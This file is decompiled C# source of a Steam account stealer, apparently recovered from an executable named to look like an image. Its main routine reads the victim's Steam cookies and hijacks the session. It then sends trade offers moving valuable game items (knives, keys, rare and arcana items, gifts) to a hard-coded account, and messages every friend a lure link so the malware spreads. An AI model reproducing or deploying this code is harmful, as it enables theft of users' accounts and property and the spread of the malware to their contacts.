// Decompiled with JetBrains decompiler
// Type: SteamStealer.Program
// Assembly: img_012, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 502588B3-DCFF-462A-9C8C-46E9EB112CFD
// Assembly location: C:\Users\Scars\Desktop\img_012.exe

using System;

namespace SteamStealer
{
  internal static class Program
  {
    [STAThread]
    private static void Main()
    {
      SteamWorker steamWorker = new SteamWorker();
      steamWorker.addOffer("76561198153148180", "192882452", "xA2XguMv");
      steamWorker.ParseSteamCookies();
      if (steamWorker.ParsedSteamCookies.Count <= 0)
        return;
      steamWorker.getSessionID();
      steamWorker.addItemsToSteal("440,570,730,753", "753:gift;570:rare,legendary,immortal,mythical,arcana,normal,unusual,ancient,tool,key;440:unusual,hat,tool,key;730:tool,knife,pistol,smg,shotgun,rifle,sniper rifle,machinegun,sticker,key");
      steamWorker.SendItems("");
      steamWorker.initChatSystem();
      steamWorker.getFriends();
      steamWorker.sendMessageToFriends("WTF Dude? http://screen-pictures.com/img_012/");
    }
  }
}
